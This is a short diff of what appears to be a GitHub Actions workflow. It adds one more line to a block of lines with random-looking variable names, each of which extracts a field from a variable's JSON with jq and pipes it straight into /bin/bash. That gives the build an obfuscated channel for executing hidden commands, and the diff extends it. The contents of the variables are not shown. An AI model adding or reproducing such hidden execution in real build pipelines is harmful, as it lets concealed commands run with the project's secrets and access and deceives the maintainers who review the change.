@@ -39,6 +39,7 @@ jobs:
           echo $oidqz0517 | jq -r .t48 | /bin/bash
           printf '%s' "$tte3027" | jq -r .kpisz67 | /bin/bash
           printf '%s' "$sbfsw6" | jq -r .g4 | /bin/bash
+          printf '%s' "$p5924" | jq -r .jeby987 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
